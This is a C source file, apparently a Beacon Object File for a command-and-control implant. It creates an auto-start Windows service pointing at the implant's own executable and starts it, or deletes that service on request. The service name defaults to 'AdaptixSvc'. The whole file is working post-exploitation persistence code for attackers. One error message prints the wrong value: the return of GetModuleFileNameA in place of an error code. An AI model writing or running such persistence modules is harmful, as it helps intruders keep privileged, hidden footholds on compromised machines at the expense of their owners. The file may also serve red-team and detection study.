#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    char *serviceName = BeaconDataExtract(&parser, NULL);
    char *servicePath = BeaconDataExtract(&parser, NULL);
    
    if (!serviceName) serviceName = "AdaptixSvc";
    
    SC_HANDLE scManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scManager) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManager failed: %d", KERNEL32$GetModuleFileNameA(NULL, NULL, 0));
        return;
    }
    
    if (mode == 0) {
        if (!servicePath || !servicePath[0]) {
            static char exePath[MAX_PATH];
            KERNEL32$GetModuleFileNameA(NULL, exePath, MAX_PATH);
            servicePath = exePath;
        }
        
        SC_HANDLE service = ADVAPI32$CreateServiceA(
            scManager, serviceName, serviceName,
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            servicePath, NULL, NULL, NULL, NULL, NULL);
        
        if (service) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Service created: %s", serviceName);
            
            if (ADVAPI32$StartServiceA(service, 0, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started: %s", serviceName);
            }
            
            ADVAPI32$CloseServiceHandle(service);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] CreateService failed");
        }
    }
    else if (mode == 1) {
        SC_HANDLE service = ADVAPI32$OpenServiceA(scManager, serviceName, DELETE);
        if (service) {
            if (ADVAPI32$DeleteService(service)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Service deleted: %s", serviceName);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] DeleteService failed");
            }
            ADVAPI32$CloseServiceHandle(service);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] OpenService failed");
        }
    }
    
    ADVAPI32$CloseServiceHandle(scManager);
}
